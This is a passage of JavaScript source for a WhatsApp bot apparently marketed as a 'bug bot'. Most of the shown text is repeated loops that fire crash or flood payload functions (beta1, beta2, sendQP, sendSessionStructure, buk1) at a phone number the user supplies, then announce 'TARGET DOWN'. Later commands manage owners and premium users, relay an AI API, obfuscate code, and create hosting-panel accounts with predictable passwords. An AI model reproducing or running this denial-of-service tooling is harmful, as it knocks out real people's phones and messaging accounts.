await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)

}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆

    𝐍𝐎𝐓𝐄
> 𝐂𝚮𝚫𝚪𝚰𝐒𝚳𝑨-𝐵𝑈𝐺 𝐵𝛩𝑇 TOOK DOWN TARGET`)
break

case 'charis': case 'vasion': case 'crashflow': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 234×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 40; i++) {
await buk1(zyn, target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆

    𝐍𝐎𝐓𝐄
> TARGET DOWN!`)

break

case "owner": {
if (!isPremium) return reply('WHO ARE YOU ??')
const repf = await zyn.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
zyn.sendMessage(from, { text : `Nih Owner Gw Jangan Macem"`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break

case "addowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 237×××`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await zyn.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break

case "delowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 234×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${ya} removed as Owner!!!`)
break

case 'setowner': {
if (!isOwner) return reply('kusus owner')
if (!text) return reply(`Contoh : ${prefix + command} 234×××`)
global.owner = text.split("|")[0]
 reply(`Exif berhasil diubah menjadi\n\n• No Owner : ${global.owner}`)
}
break

case 'self': {
if (!isOwner) return reply(mess.only.owner)
zyn.public = false
reply('Succes Mode Private')
}
break

case "addprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 234×××`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await zyn.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break

case "delprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 234×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(prem))
reply(`Nomor ${ya} is not more  Premium!`)
}
break

case 'public': {
if (!isOwner) return reply(mess.only.owner)
zyn.public = true
reply('Succes Mode Public')
}
break

case "qc": {
if (!isOwner)return reply(mess.only.owner)
if (!quoted){
const getname = await zyn.getName(mentionUser[0])
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": getname,
"photo": {
"url": ppuser
}
},
"text": quotedMsg.chats,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
zyn.sendStimg(from, buffer, m, opt)
});
} else if (q) {
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": ppuser
}
},
"text": q,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
zyn.sendStimg(from, buffer, m, opt)
});
} else {
reply(`Kirim perintah ${prefix+command} poxxytzy`)
}
}
break

case 'mangap': {
reply(`Makasi Kakak ${pushname} Atas Pujiannya`) 
}
break

case 'ai': {
	if (!text) return reply(`*• Example:* ${prefix + command} Siapakah orang yang telah menemukan Komputer di jaman Majapahit`);  
await zyn.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
let gpt = await (await fetch(`https://widipe.com/openai?text=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Zyn - AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: namabot
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./database/image/Xynz.jpg')}, { upload: zyn.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
"buttonParamsJson": `{"display_text":"Nice Zyn - AI","id":".mangap"}`
            }],
          }),
          contextInfo: {
  mentionedJid: [m.sender], 
  forwardingScore: 999,
  isForwarded: true,
forwardedNewsletterMessageInfo: {
  newsletterJid: '0@newsletter',
  newsletterName: namabot,
  serverMessageId: 143
}
}
       })
    }
  }
}, { quoted: m })
await zyn.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("Error Kak :(")
}
}
break

case 'enc': case 'encrypt': case 'obfuscate':
{
if (!q) return reply(`Contoh ${prefix+command} const time = require('money')`)
let meg = await obfus(q)
reply(`${meg.result}`)
}
break

case '1gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "50"
let disk = "1024"
let email = username + "Zyn@Tzy.com"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '2gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "2024"
let cpu = "70"
let disk = "2024"
let email = username + "Zyn@Tzy.com"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '3gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "3024"
let cpu = "80"
let disk = "3024"
let email = username + "Zyn@Tzy.com"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
